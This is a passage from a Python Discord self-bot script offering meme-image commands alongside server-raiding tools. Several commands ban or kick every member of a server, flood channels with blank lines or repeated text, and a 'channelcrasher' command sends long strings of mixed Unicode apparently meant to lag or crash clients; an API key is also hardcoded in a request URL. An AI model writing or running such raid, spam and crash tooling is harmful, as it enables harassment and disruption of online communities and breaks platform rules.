                                                                     "Example: " + prefix + "reverse bruh", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    try:
        commandprint("Command 'reverse' has been used by " + bot.user.name + " with a message of '" + text + "'")
        await ctx.send(text[::-1])
    except Exception as error:
        errorprint("Exception ' {0} ', Message is too long".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Message is too long \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['question'])
async def ask(ctx, *, question = None):
    await ctx.message.delete()
    commandprint("Command 'question' has been used by " + bot.user.name)
    if question is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a question \n"
                                                                     "Example: " + prefix + "question when did hitler die", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    try:
        r = requests.get(f"https://api.wolframalpha.com/v1/result?appid=85PTL6-9YEK2RE4HQ&i=" + question + f"%3F").text
        embed = discord.Embed(title=f" __**{question}?**__ ", description=f"{r}", color=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', Unknown".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def threats(ctx, image: str = None):
    await ctx.message.delete()
    commandprint("Command 'threats' has been used by " + bot.user.name)
    if image is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a image \n"
                                                                     "Example: " + prefix + "threats https://image.com", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            p = requests.get(f"https://nekobot.xyz/api/imagegen?type=threats&url={image}")
            embed=discord.Embed(color=color)
            embed.set_footer(text=footer)
            embed.set_image(url = p.json()['message'])
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Invalid parameters".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid parameters \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def magik(ctx, image: str = None, intensity = None):
    await ctx.message.delete()
    commandprint("Command 'magik' has been used by " + bot.user.name)
    if image is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a image \n"
                                                                     "Example: " + prefix + "magik https://image.com 6", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    try:
        if intensity is None:
            p = requests.get(f"https://nekobot.xyz/api/imagegen?type=magik&intensity=10&image={image}")
        else:
            p = requests.get(f"https://nekobot.xyz/api/imagegen?type=magik&intensity={intensity}&image={image}")
        embed=discord.Embed(color=color)
        embed.set_footer(text=footer)
        embed.set_image(url = p.json()['message'])
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', Invalid parameters".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid parameters \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def changemymind(ctx, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'changemymind' has been used by " + bot.user.name)
    if text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "changemymind discord shouldnt sell to microsoft", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            p = requests.get(f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}")
            embed=discord.Embed(color=color)
            embed.set_footer(text=footer)
            embed.set_image(url = p.json()['message'])
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Invalid parameters".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid parameters \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def iphonex(ctx, url: str = None):
    await ctx.message.delete()
    commandprint("Command 'iphonex' has been used by " + bot.user.name)
    if url is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a image \n"
                                                                     "Example: " + prefix + "iphonex https://imageinnit.com", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            p = requests.get(f"https://nekobot.xyz/api/imagegen?type=iphonex&url={url}")
            embed=discord.Embed(color=color)
            embed.set_footer(text=footer)
            embed.set_image(url = p.json()['message'])
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Invalid parameters".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid parameters \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def trumptweet(ctx, *, text = None):
    await ctx.message.delete()
    if text is None:
        commandprint("Command 'trumptweet' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "trumptweet i am declearing war against china", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command 'trumptweet' has been used by " + bot.user.name + " with a message of '" + text + "'")
            p = requests.get(f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}")
            embed=discord.Embed(color=color)
            embed.set_footer(text=footer)
            embed.set_image(url = p.json()['message'])
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Unknown".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member : discord.User=None, *, reason = None):
    await ctx.message.delete()
    commandprint("Command 'ban' has been used by " + bot.user.name)
    if member is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a member \n"
                                                                     "Example: " + prefix + "ban @Flairings stupid", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif reason is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a member \n"
                                                                     "Example: " + prefix + "ban @Flairings stupid", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            await member.ban(reason=reason)
            embed=discord.Embed(title=f"**{bot.user.name} HAS BANNED {member}**", color=color)
            await ctx.send(embed=embed, delete_after=deletetimer)
            embed.set_footer(text=footer)
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
@commands.has_permissions(administrator=True)
async def unban(ctx, member : discord.Member, *, reason):
    await ctx.message.delete()
    commandprint("Command 'unban' has been used by " + bot.user.name)
    if member is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a member \n"
                                                                     "Example: " + prefix + "unban @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            await member.unban(reason=reason)
            embed=discord.Embed(title=f"**UNBANNED {member}**")
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def massban(ctx):
    await ctx.message.delete()
    commandprint("Command 'massban' has been used by " + bot.user.name)
    try:
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                warningprint("Could not complete 'user.ban'")
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def masskick(ctx):
    await ctx.message.delete()
    commandprint("Command 'masskick' has been used by " + bot.user.name)
    try:
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                print("could not complete task user.kick")
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def massunban(ctx):
    await ctx.message.delete()
    commandprint("Command 'massunban' has been used by " + bot.user.name)
    try:
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await ctx.guild.unban(user=users.user)
            except:
                print("could not complete task guild.unban")
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(pass_context=True)
async def banlist(ctx):
    await ctx.message.delete()
    commandprint("Command 'banlist' has been used by " + bot.user.name)
    try:
        bans = await ctx.guild.bans()
        em = discord.Embed(title=f'**LIST OF BANNED USERS ({len(bans)})**:', color=color)
        em.description = ', '.join([str(b.user) for b in bans])
        await ctx.send(embed=em, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    commandprint("Command 'nuke' has been used by " + bot.user.name)
    try:
        await ctx.send("‎\n" * 500)
        await ctx.send("‎\n" * 500)
        await ctx.send("‎\n" * 500)
        await ctx.send("‎\n" * 500)
        await ctx.send("‎\n" * 500)
        await asyncio.sleep(2)
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def spam(ctx, amount: int = None, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'spam' has been used by " + bot.user.name)
    if amount is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a amount \n"
                                                                     "Example: " + prefix + "spam 5 hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "spam 5 hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        for i in range(amount):
            try:
                await ctx.send(text)
            except Exception as error:
                errorprint("Exception ' {0} ', UNKNOWN ".format(error))
                em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
                await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def channelcrasher(ctx):
    await ctx.message.delete()
    commandprint("Command 'channelcrasher' has been used by " + bot.user.name)
    try:
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭ⏆ष᳼༊")
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ 